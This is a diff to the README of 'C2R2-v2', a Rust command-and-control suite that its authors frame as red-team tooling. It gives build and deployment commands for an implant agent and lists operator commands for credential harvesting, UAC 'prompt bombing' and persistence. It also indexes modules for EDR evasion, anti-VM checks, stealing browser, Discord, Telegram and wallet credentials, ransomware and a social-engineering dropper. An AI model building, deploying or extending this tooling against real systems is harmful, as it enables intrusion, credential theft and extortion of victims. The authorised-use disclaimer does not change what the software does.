@@ -10,182 +10,198 @@ This tool is provided for security researchers, penetration testers, and educati
 
 The authors and contributors assume no liability for misuse or damages caused by this software. By using C2R2-v2, you agree to use it only on systems you own or have written authorization to test.
 
-## 📚 Documentation Overview
+---
 
-This documentation is organized into the following sections:
+## 📚 Documentation Index
 
 ### Getting Started
-- **[Installation Guide](INSTALLATION.md)** - Build and setup instructions
-- **[Quick Start](USAGE.md#quick-start)** - Get up and running quickly
-- **[Usage Guide](USAGE.md)** - Command reference and examples
+| Document | Description |
+|----------|-------------|
+| [Installation Guide](INSTALLATION.md) | Prerequisites, building, and deployment |
+| [Usage Guide](USAGE.md) | Command reference and operational workflows |
+| [Quick Start with Docker](guides/DOCKER.md) | Build everything with Docker in minutes |
 
 ### Architecture & Design
-- **[System Architecture](ARCHITECTURE.md)** - Overall system design and component interaction
-- **[Modules Overview](MODULES.md)** - Detailed module documentation
-- **[API Reference](API.md)** - Developer API documentation
+| Document | Description |
+|----------|-------------|
+| [System Architecture](ARCHITECTURE.md) | Component design, data flow, and protocols |
+| [Modules Documentation](MODULES.md) | Module system and stealer capabilities |
+| [API Reference](API.md) | Developer API for extending C2R2 |
+
+### Deployment Guides
+| Document | Description |
+|----------|-------------|
+| [Docker Build](guides/DOCKER.md) | Docker-based compilation |
+| [Network Deployment](guides/NETWORK_DEPLOYMENT.md) | LAN, WAN, and port forwarding setup |
+| [Raspberry Pi Setup](guides/RASPBERRY_PI_SETUP.md) | Complete Pi deployment guide |
+
+### Features
+| Document | Description |
+|----------|-------------|
+| [Evasion Techniques](features/EVASION.md) | Anti-sandbox, anti-VM, and AV bypass |
+| [Persistence Mechanisms](features/PERSISTENCE.md) | Registry, scheduled tasks, WMI, startup |
+| [Credential Stealer](features/STEALER.md) | Browser, Discord, Telegram, wallet harvesting |
+| [Ransomware Module](features/RANSOMWARE.md) | File encryption capabilities |
+| [Dropper System](features/DROPPER.md) | Social engineering and payload delivery |
+| [Privilege Escalation](features/ELEVATE.md) | UAC bypass and elevation techniques |
 
 ### Development
-- **[Development Guide](DEVELOPMENT.md)** - Contributing and extending C2R2-v2
-- **[Contributing Guidelines](CONTRIBUTING.md)** - How to contribute to the project
-- **[Security Considerations](SECURITY.md)** - Security best practices and threat model
+| Document | Description |
+|----------|-------------|
+| [Development Guide](DEVELOPMENT.md) | Project structure, building, and debugging |
+| [Contributing Guidelines](CONTRIBUTING.md) | How to contribute to the project |
+| [Security Considerations](SECURITY.md) | OPSEC, threat model, and best practices |
 
-### Reference
-- **[Changelog](../CHANGELOG.md)** - Version history and changes
-- **[License](../LICENSE)** - Project license information
+### Troubleshooting
+| Document | Description |
+|----------|-------------|
+| [Connection Issues](troubleshooting/CONNECTION.md) | Agent connection and network problems |
+| [Build Issues](troubleshooting/BUILD.md) | Compilation and cross-compilation fixes |
+| [Common Problems (ES)](troubleshooting/SOLUCION_PROBLEMAS_ES.md) | Spanish troubleshooting guide |
+
+### Component Documentation
+| Component | README |
+|-----------|--------|
+| Builder | [builder/README.md](../builder/README.md) |
+| Team Client | [team-client/README.md](../team-client/README.md) |
+| Stealer DLL | *See [Modules](MODULES.md)* |
+| Ransomware DLL | [ransomware-dll/README.md](../ransomware-dll/README.md) |
+| Dropper (Rust) | [dropper-rust/README.md](../dropper-rust/README.md) |
+
+---
 
 ## 🎯 What is C2R2-v2?
 
 C2R2-v2 is a modular offensive security suite written in Rust, inspired by frameworks like Havoc C2 and Cobalt Strike. It provides:
 
-- **Lightweight Agent** - Minimal footprint (~60KB) with beacon communication
+- **Lightweight Agent** (~60KB) with beacon communication
 - **Modular Architecture** - Load capabilities on-demand via encrypted modules
 - **Cross-Platform Builder** - Build Windows agents from Linux/WSL
-- **Advanced Evasion** - Syscalls, obfuscation, and anti-analysis techniques
-- **Credential Harvesting** - Multi-browser credential stealing capabilities
-- **Persistence Mechanisms** - Multiple persistence methods (Registry, Tasks, WMI)
-- **File Operations** - Bidirectional file transfer with Base64 encoding
+- **Team Client** - GUI for multi-operator deployments via SSH tunnel
+- **Advanced Evasion** - Direct syscalls, string obfuscation, anti-analysis
+- **TLS 1.3 Encryption** - Secure agent-server communications
 
 ## 🏗️ Architecture Overview
 
-C2R2-v2 consists of four main components:
-
 ```
-┌─────────────────┐
-│   C2 Server     │ ◄─── Operator Interface (TCP)
-│   (c2r2-server) │
-└────────┬────────┘
-         │
-         │ TCP Connection (Beacon)
-         ▼
-┌─────────────────┐
-│     Agent       │ ◄─── Target System (Windows)
-│   (agent.exe)   │
-└────────┬────────┘
-         │
-         │ Dynamic Module Loading
-         ▼
-┌─────────────────┐
-│  Stealer DLL    │ ◄─── Encrypted Module
-│ (stealer.dll)   │
-└─────────────────┘
-
-┌─────────────────┐
-│    Builder      │ ◄─── Agent Generation Tool
-│   (builder)     │
-└─────────────────┘
+┌─────────────────────┐                    ┌─────────────────────┐
+│  Operator Machine   │      SSH (22)      │   Red Team Server   │
+│  ┌───────────────┐  │  ════════════════> │  ┌───────────────┐  │
+│  │ Team Client   │──┼────────────────────┼──│  C2 Server    │  │
+│  │   (GUI)       │  │                    │  │  API:5555     │  │
+│  └───────────────┘  │                    │  │  Agents:4444  │  │
+└─────────────────────┘                    │  └───────┬───────┘  │
+                                           │   🔐 TLS Encrypted  │
+                                           │          ▼          │
+                                           │  ┌───────────────┐  │
+                                           │  │    Agent      │──┼─► Dynamic Module Loading
+                                           │  │  (agent.exe)  │  │
+                                           │  └───────────────┘  │
+                                           └─────────────────────┘
 ```
 
 ### Components
 
-1. **Agent** (`agent/`) - Lightweight implant that runs on target systems
-2. **C2 Server** (`c2r2-server/`) - Command and control server with multi-client support
-3. **Builder** (`builder/`) - Tool to build and configure agents
-4. **Stealer DLL** (`stealer-dll/`) - Modular credential harvesting capability
+| Component | Description |
+|-----------|-------------|
+| **Agent** | Lightweight Windows implant with beacon communication |
+| **C2 Server** | Async multi-client server with CLI and REST/WebSocket API |
+| **Builder** | Agent generation and module encryption tool |
+| **Team Client** | Python GUI for operators (SSH-tunneled API access) |
+| **Stealer DLL** | Modular credential harvesting |
+| **Ransomware DLL** | File encryption module |
 
-## 🚀 Quick Example
+## 🚀 Quick Start
+
+### Docker (Recommended)
 
 ```bash
-# 1. Build the stealer module
-./build-stealer.sh
-
-# 2. Encrypt the module
-cd builder
-cargo run --release -- encrypt-module
-
-# 3. Build an agent
-cargo run --release -- build-agent --name agent1 --server 192.168.1.10:4444
-
-# 4. Start the C2 server
-cd ../c2r2-server
-cargo run --release
-
-# 5. Deploy agent to target and interact
-# In C2 console:
-/list                          # List connected agents
-/select 1                      # Select agent
-/cmd whoami                    # Execute command
-/harvest                       # Steal credentials
-/persist registry              # Establish persistence
+./docker-build.sh --ip 192.168.1.10 --port 4444 --production
+# All binaries in dist/
 ```
 
-## 📖 Key Features
+### Manual Build
 
-### Beacon Communication
-- Configurable check-in intervals with jitter
-- Exponential backoff on connection failures
-- Reduces network signature and evades detection
+```bash
+# 1. Build stealer module
+./build-stealer.sh
 
-### Command Obfuscation
-- Automatic ArgFuscator-style command obfuscation
-- Random case changes, caret insertion, quote wrapping
-- Environment variable substitution
+# 2. Encrypt module and build agent
+cd builder
+cargo run --release -- encrypt-module
+cargo run --release -- build-agent --name agent --server 192.168.1.10:4444 --production
 
-### Modular Design
-- Base agent is lightweight (~60KB)
-- Additional capabilities loaded as encrypted modules
-- Module encryption with AES-256-GCM
+# 3. Start server
+cd ../c2r2-server
+./target/release/c2r2-server --bind 0.0.0.0 --port 4444
+```
 
-### Multi-Target Support
-- Handle multiple agents simultaneously
-- Broadcast commands to all agents
-- Individual agent selection and management
+See [Installation Guide](INSTALLATION.md) for detailed instructions.
 
-### Advanced Persistence
-- Windows Registry modification
-- Scheduled Task creation
-- WMI Event Subscription
-- Startup folder persistence
+## 📋 Available Commands
+
+```
+📋 Client Management:
+   /list                      - List connected clients
+   /select <id>               - Select a client
+   /info <id>                 - Show client details
+
+💻 Command Execution:
+   /cmd <command>             - Execute on selected client
+   /cmd_all <command>         - Execute on ALL clients
+
+📁 File Operations:
+   /download <path>           - Download from agent
+   /upload <local> <remote>   - Upload to agent
+
+🔧 Advanced Operations:
+   /harvest                   - Harvest credentials
+   /elevate                   - UAC elevation (prompt bombing)
+   /persist <method>          - Establish persistence
+   /beacon <int:jit>          - Configure beacon timing
+```
 
 ## 🔒 Security Features
 
-- **Direct Syscalls** - Bypass userland hooks (EDR evasion)
-- **String Obfuscation** - Compile-time string encryption with `obfstr`
-- **Module Encryption** - AES-256-GCM encrypted capability modules
-- **No Disk Writes** - Modules loaded directly into memory
-- **Process Injection** - Memory injection techniques for stealth
+| Feature | Description |
+|---------|-------------|
+| Direct Syscalls | Bypass userland API hooks (EDR evasion) |
+| String Obfuscation | Compile-time encryption with `obfstr` |
+| Module Encryption | AES-256-GCM encrypted capability modules |
+| Beacon with Jitter | Randomized check-in timing |
+| Anti-Analysis | VM, sandbox, and debugger detection |
+| TLS 1.3 | Encrypted agent-server communications |
 
 ## 📝 Development Status
 
-C2R2-v2 is under active development. Current version: **2.0.0**
+**Current Version: 2.0.0**
 
-### Implemented
-- ✅ Direct TCP beacon communication
-- ✅ Multi-client server architecture
-- ✅ Command execution with obfuscation
-- ✅ File transfer (upload/download)
-- ✅ Credential harvesting module
-- ✅ Multiple persistence mechanisms
-- ✅ Cross-compilation support
-- ✅ Logging and diagnostics
+### ✅ Implemented
+- TLS encrypted beacon communication
+- Multi-client server with CLI and API
+- Command execution with obfuscation
+- File transfer (upload/download)
+- Credential harvesting (browsers, Discord, Telegram, wallets)
+- Multiple persistence mechanisms
+- Docker build system
+- Team Client GUI
 
-### Planned
-- [ ] Additional persistence methods
-- [ ] Process injection capabilities
-- [ ] Lateral movement modules
-- [ ] Alternative C2 channels (HTTP/HTTPS, DNS)
-- [ ] Web-based C2 interface
-- [ ] Telegram bot interface
-
-## 🤝 Contributing
-
-We welcome contributions! Please read our [Contributing Guidelines](CONTRIBUTING.md) before submitting pull requests.
-
-## 📄 License
-
-This project is provided for educational purposes. See [LICENSE](../LICENSE) for details.
-
-## 🙏 Acknowledgments
-
-C2R2-v2 is inspired by:
-- **Havoc C2** - Modern C2 framework design
-- **Cobalt Strike** - Professional red team operations
-- **Metasploit** - Modular architecture
-- **Covenant** - .NET C2 framework
-
-## 📧 Contact
-
-For questions, issues, or security concerns, please use GitHub Issues or contact the maintainers.
+### 🔮 Planned
+- HTTP/HTTPS/DNS C2 channels
+- Process injection module
+- Lateral movement capabilities
+- Web-based C2 interface
 
 ---
 
-**Remember: With great power comes great responsibility. Use this tool ethically and legally.**
+## 🤝 Contributing
+
+See [Contributing Guidelines](CONTRIBUTING.md) for how to contribute.
+
+## 📄 License
+
+MIT License - See [LICENSE](../LICENSE) for details.
+
+---
+
+**⚠️ Remember: With great power comes great responsibility. Use this tool ethically and legally.**
